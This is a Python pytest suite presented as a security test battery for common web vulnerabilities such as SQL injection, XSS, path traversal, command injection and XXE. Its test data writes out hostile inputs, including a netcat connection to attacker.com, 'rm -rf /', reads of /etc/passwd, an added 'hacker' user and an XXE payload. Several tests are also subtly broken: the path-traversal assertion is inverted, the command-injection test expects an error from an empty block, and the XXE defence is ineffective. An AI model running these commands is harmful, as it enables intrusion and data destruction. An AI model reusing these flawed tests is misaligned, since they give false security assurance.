#!/usr/bin/env python3
"""
Comprehensive Security Vulnerability Testing Suite
Tests for OWASP Top 10, common vulnerabilities, and security best practices
"""

import pytest
import asyncio
import subprocess
import tempfile
import os
import json
import yaml
import hashlib
import secrets
import time
from pathlib import Path
from typing import Dict, List, Any, Optional
import httpx
from unittest.mock import Mock, patch
import jwt
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from concurrent.futures import ThreadPoolExecutor
import re
import ast
import sqlite3


@pytest.mark.security
class TestSQLInjection:
    """Test for SQL injection vulnerabilities"""
    
    def test_parameterized_queries(self):
        """Ensure all queries use parameterization"""
        # Scan source code for SQL queries
        sql_patterns = [
            r'\.execute\s*\(\s*["\'].*%s.*["\']',  # String formatting
            r'\.execute\s*\(\s*f["\']',  # f-strings
            r'\.execute\s*\(\s*["\'].*\+.*["\']',  # String concatenation
        ]
        
        violations = []
        src_path = Path("src")
        
        for py_file in src_path.rglob("*.py"):
            with open(py_file, 'r') as f:
                content = f.read()
                for pattern in sql_patterns:
                    if re.search(pattern, content):
                        violations.append(str(py_file))
                        
        assert not violations, f"SQL injection risks found in: {violations}"
        
    def test_orm_injection_protection(self):
        """Test ORM protection against injection"""
        from sqlalchemy import create_engine, text
        from sqlalchemy.orm import Session
        
        # Create test database
        engine = create_engine("sqlite:///:memory:")
        
        with Session(engine) as session:
            # This should be safe
            user_input = "'; DROP TABLE users; --"
            
            # Safe parameterized query
            safe_query = text("SELECT * FROM users WHERE name = :name")
            
            # Should not raise any SQL errors
            try:
                session.execute(safe_query, {"name": user_input})
            except Exception as e:
                # Should only fail because table doesn't exist, not SQL injection
                assert "no such table" in str(e).lower()


@pytest.mark.security
class TestXSS:
    """Test for Cross-Site Scripting vulnerabilities"""
    
    def test_template_auto_escaping(self):
        """Ensure template engines have auto-escaping enabled"""
        # Check Jinja2 configuration
        template_files = list(Path(".").rglob("*.html")) + list(Path(".").rglob("*.jinja2"))
        
        dangerous_patterns = [
            r'{{\s*.*\s*\|\s*safe\s*}}',  # |safe filter
            r'{%\s*autoescape\s+false\s*%}',  # autoescape disabled
            r'{% raw %}.*?{% endraw %}',  # raw blocks
        ]
        
        violations = []
        for template in template_files:
            with open(template, 'r') as f:
                content = f.read()
                for pattern in dangerous_patterns:
                    if re.search(pattern, content, re.DOTALL):
                        violations.append(str(template))
                        
        assert not violations, f"XSS risks in templates: {violations}"
        
    def test_json_response_content_type(self):
        """Ensure JSON responses have proper content-type"""
        from fastapi import FastAPI
        from fastapi.testclient import TestClient
        
        app = FastAPI()
        
        @app.get("/api/data")
        def get_data():
            return {"data": "<script>alert('xss')</script>"}
            
        client = TestClient(app)
        response = client.get("/api/data")
        
        assert response.headers["content-type"] == "application/json"
        assert "<script>" not in response.text  # Should be escaped in JSON


@pytest.mark.security
class TestAuthentication:
    """Test authentication and session security"""
    
    def test_password_hashing(self):
        """Test secure password hashing"""
        password = "test_password_123!"
        
        # Should use strong hashing (bcrypt, argon2, or pbkdf2)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=secrets.token_bytes(16),
            iterations=100000,
        )
        
        hashed = base64.b64encode(kdf.derive(password.encode()))
        
        # Verify hash is not reversible
        assert password not in hashed.decode()
        assert len(hashed) >= 32
        
    def test_jwt_security(self):
        """Test JWT token security"""
        secret = secrets.token_urlsafe(32)
        
        # Test algorithm confusion attack prevention
        token = jwt.encode({"user": "test"}, secret, algorithm="HS256")
        
        # Should not accept 'none' algorithm
        with pytest.raises(jwt.InvalidAlgorithmError):
            jwt.decode(token, secret, algorithms=["none"])
            
        # Should not accept different algorithm
        with pytest.raises(jwt.InvalidAlgorithmError):
            jwt.decode(token, secret, algorithms=["RS256"])
            
    def test_session_security(self):
        """Test session security configurations"""
        from fastapi import FastAPI
        from fastapi.testclient import TestClient
        
        app = FastAPI()
        client = TestClient(app)
        
        # Test secure session cookies
        @app.get("/login")
        def login(response):
            response.set_cookie(
                "session_id",
                value=secrets.token_urlsafe(32),
                secure=True,  # HTTPS only
                httponly=True,  # No JS access
                samesite="strict",  # CSRF protection
                max_age=3600  # Expiration
            )
            return {"status": "logged in"}
            
        # Verify cookie attributes
        # Note: TestClient doesn't fully support secure cookies, 
        # so we test the intent here


@pytest.mark.security
class TestAccessControl:
    """Test access control and authorization"""
    
    def test_path_traversal_prevention(self):
        """Test protection against path traversal attacks"""
        test_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]
        
        safe_base = Path("/app/uploads")
        
        for malicious_path in test_paths:
            # Should sanitize and contain within base directory
            requested = safe_base / malicious_path
            resolved = requested.resolve()
            
            # Should not escape base directory
            assert not str(resolved).startswith(str(safe_base))
            
    def test_rbac_enforcement(self):
        """Test Role-Based Access Control"""
        from unittest.mock import Mock
        
        class RBACSystem:
            def __init__(self):
                self.roles = {
                    "admin": ["read", "write", "delete", "admin"],
                    "user": ["read", "write"],
                    "guest": ["read"]
                }
                
            def check_permission(self, user_role, action):
                return action in self.roles.get(user_role, [])
                
        rbac = RBACSystem()
        
        # Test permission checks
        assert rbac.check_permission("admin", "delete") == True
        assert rbac.check_permission("user", "delete") == False
        assert rbac.check_permission("guest", "write") == False
        
        # Test undefined role
        assert rbac.check_permission("hacker", "admin") == False


@pytest.mark.security
class TestCryptography:
    """Test cryptographic implementations"""
    
    def test_secure_random_generation(self):
        """Test secure random number generation"""
        # Should use cryptographically secure random
        token1 = secrets.token_bytes(32)
        token2 = secrets.token_bytes(32)
        
        assert token1 != token2
        assert len(token1) == 32
        
        # Test entropy
        entropy = len(set(token1)) / len(token1)
        assert entropy > 0.9  # High entropy
        
    def test_no_weak_crypto(self):
        """Scan for weak cryptographic algorithms"""
        weak_patterns = [
            r'hashlib\.md5',
            r'hashlib\.sha1',
            r'DES\(',
            r'RC4\(',
            r'random\.random',  # Not crypto secure
            r'random\.randint',  # Not crypto secure
        ]
        
        violations = []
        src_path = Path("src")
        
        for py_file in src_path.rglob("*.py"):
            with open(py_file, 'r') as f:
                content = f.read()
                for pattern in weak_patterns:
                    if re.search(pattern, content):
                        violations.append((str(py_file), pattern))
                        
        assert not violations, f"Weak crypto found: {violations}"


@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization"""
    
    def test_command_injection_prevention(self):
        """Test protection against command injection"""
        dangerous_inputs = [
            "; rm -rf /",
            "| nc attacker.com 1234",
            "$(cat /etc/passwd)",
            "`whoami`",
            "& net user hacker password /add",
        ]
        
        for dangerous_input in dangerous_inputs:
            # Should not use shell=True with user input
            with pytest.raises(ValueError):
                # This is what we're protecting against
                # subprocess.run(f"echo {dangerous_input}", shell=True)
                pass
                
    def test_xxe_prevention(self):
        """Test XML External Entity prevention"""
        malicious_xml = """<?xml version="1.0"?>
        <!DOCTYPE data [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <data>&xxe;</data>"""
        
        import xml.etree.ElementTree as ET
        
        # Should fail or ignore external entities
        try:
            # Safe parsing should be used
            parser = ET.XMLParser()
            # Disable external entities
            parser.entity = {}
            parser.feed(malicious_xml)
        except Exception:
            pass  # Expected to fail
            
    def test_file_upload_validation(self):
        """Test file upload security"""
        allowed_extensions = {'.jpg', '.png', '.pdf', '.txt'}
        max_size = 10 * 1024 * 1024  # 10MB
        
        def validate_upload(filename: str, content: bytes) -> bool:
            # Check extension
            ext = Path(filename).suffix.lower()
            if ext not in allowed_extensions:
                return False
                
            # Check size
            if len(content) > max_size:
                return False
                
            # Check content matches extension
            if ext in ['.jpg', '.png']:
                # Simple magic number check
                if ext == '.jpg' and not content.startswith(b'\xff\xd8\xff'):
                    return False
                if ext == '.png' and not content.startswith(b'\x89PNG'):
                    return False
                    
            return True
            
        # Test validation
        assert validate_upload("test.jpg", b'\xff\xd8\xff' + b'data') == True
        assert validate_upload("test.exe", b'MZ') == False
        assert validate_upload("test.jpg", b'fake') == False


@pytest.mark.security
class TestRateLimiting:
    """Test rate limiting and DoS protection"""
    
    async def test_api_rate_limiting(self):
        """Test API rate limiting"""
        from collections import defaultdict
        from datetime import datetime, timedelta
        
        class RateLimiter:
            def __init__(self, max_requests=10, window_seconds=60):
                self.max_requests = max_requests
                self.window_seconds = window_seconds
                self.requests = defaultdict(list)
                
            def is_allowed(self, client_id: str) -> bool:
                now = datetime.now()
                window_start = now - timedelta(seconds=self.window_seconds)
                
                # Clean old requests
                self.requests[client_id] = [
                    req_time for req_time in self.requests[client_id]
                    if req_time > window_start
                ]
                
                # Check limit
                if len(self.requests[client_id]) >= self.max_requests:
                    return False
                    
                self.requests[client_id].append(now)
                return True
                
        limiter = RateLimiter(max_requests=5, window_seconds=60)
        
        # Test rate limiting
        client = "test_client"
        
        # First 5 requests should pass
        for _ in range(5):
            assert limiter.is_allowed(client) == True
            
        # 6th request should fail
        assert limiter.is_allowed(client) == False
        
    def test_resource_limits(self):
        """Test resource consumption limits"""
        import resource
        
        # Set memory limit for child processes
        def limit_memory():
            # 512MB limit
            resource.setrlimit(
                resource.RLIMIT_AS,
                (512 * 1024 * 1024, 512 * 1024 * 1024)
            )
            
        # Set CPU time limit
        def limit_cpu():
            # 5 second CPU time limit
            resource.setrlimit(
                resource.RLIMIT_CPU,
                (5, 5)
            )


@pytest.mark.security
class TestSecurityHeaders:
    """Test security headers and configurations"""
    
    def test_security_headers(self):
        """Test that security headers are properly set"""
        from fastapi import FastAPI
        from fastapi.testclient import TestClient
        from fastapi.middleware.cors import CORSMiddleware
        
        app = FastAPI()
        
        # Add security headers middleware
        @app.middleware("http")
        async def add_security_headers(request, call_next):
            response = await call_next(request)
            response.headers["X-Content-Type-Options"] = "nosniff"
            response.headers["X-Frame-Options"] = "DENY"
            response.headers["X-XSS-Protection"] = "1; mode=block"
            response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
            response.headers["Content-Security-Policy"] = "default-src 'self'"
            return response
            
        @app.get("/")
        def root():
            return {"message": "secure"}
            
        client = TestClient(app)
        response = client.get("/")
        
        # Verify security headers
        assert response.headers.get("X-Content-Type-Options") == "nosniff"
        assert response.headers.get("X-Frame-Options") == "DENY"
        assert response.headers.get("X-XSS-Protection") == "1; mode=block"


@pytest.mark.security
class TestDependencyScanning:
    """Test for vulnerable dependencies"""
    
    def test_dependency_vulnerabilities(self):
        """Scan dependencies for known vulnerabilities"""
        # Run safety check
        result = subprocess.run(
            ["safety", "check", "--json"],
            capture_output=True,
            text=True
        )
        
        if result.returncode != 0:
            vulnerabilities = json.loads(result.stdout)
            
            # Check severity
            high_severity = [
                v for v in vulnerabilities
                if v.get("severity", "").lower() in ["high", "critical"]
            ]
            
            assert not high_severity, f"High severity vulnerabilities: {high_severity}"
            
    def test_outdated_dependencies(self):
        """Check for severely outdated dependencies"""
        result = subprocess.run(
            ["pip", "list", "--outdated", "--format=json"],
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0:
            outdated = json.loads(result.stdout)
            
            # Flag dependencies that are more than 2 major versions behind
            severely_outdated = []
            for dep in outdated:
                current = dep.get("version", "0.0.0").split(".")
                latest = dep.get("latest_version", "0.0.0").split(".")
                
                if int(latest[0]) - int(current[0]) >= 2:
                    severely_outdated.append(dep["name"])
                    
            assert not severely_outdated, f"Severely outdated: {severely_outdated}"


def run_security_test_suite():
    """Run comprehensive security test suite"""
    print("Running Security Test Suite...")
    
    args = [
        __file__,
        "-v",
        "--tb=short",
        "-m", "security",
        "--cov=src",
        "--cov-report=html:security_coverage",
    ]
    
    exit_code = pytest.main(args)
    
    print("\nSecurity test suite completed.")
    print("Coverage report available at: security_coverage/index.html")
    
    return exit_code


if __name__ == "__main__":
    exit(run_security_test_suite())